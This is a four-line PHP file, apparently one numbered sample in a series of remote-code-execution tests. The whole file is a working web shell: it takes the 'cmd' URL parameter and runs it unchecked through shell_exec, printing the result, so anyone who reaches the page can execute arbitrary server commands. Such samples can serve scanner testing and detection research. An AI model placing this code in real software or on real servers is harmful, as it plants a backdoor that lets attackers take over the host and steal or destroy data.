<?php
// RCE test variation #619
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>